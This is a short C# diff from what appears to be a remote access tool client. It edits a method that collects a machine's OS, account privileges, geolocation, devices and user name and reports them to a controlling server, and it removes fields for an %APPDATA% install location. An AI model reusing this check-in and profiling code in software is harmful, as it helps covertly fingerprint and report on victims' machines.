@@ -1,5 +1,4 @@
-﻿using Client.Packets.ServerPackets;
-using Client.Packets.ClientPackets;
+﻿using Client.Packets.ClientPackets;
 using Microsoft.Win32;
 using System;
 using System.Security.Principal;
@@ -26,16 +25,13 @@ namespace Client.Controllers.Tools
         public static bool LocationCompleted { get; private set; }
         public static bool Win32NT = Environment.OSVersion.Platform == PlatformID.Win32NT;
         public static bool vistaOrHigher = Win32NT && Environment.OSVersion.Version.Major >= 6;
-        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData; //  	%USERPROFILE%\Application Data
-        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
-        public static string SUBDIRECTORY = "";
-        public static string INSTALLNAME = "";
+        public static bool Win64Bit =  Environment.Is64BitOperatingSystem;
 
         public static void HandleGetAuthentication(ClientMosaic client)
         {
             geoLocationInitialize();            
             new GetAuthenticationResponse("01", getOperatingSystem(), getAccountType(),
-                GeoInfo.Country, GeoInfo.CountryCode, "", 0, devicesHelper(), getName(), Boot.clientID).Execute(client);
+                GeoInfo.Country, GeoInfo.CountryCode, "", 0, devicesHelper(), getName(), Boot.identifier).Execute(client);
         }
 
         public static string devicesHelper()
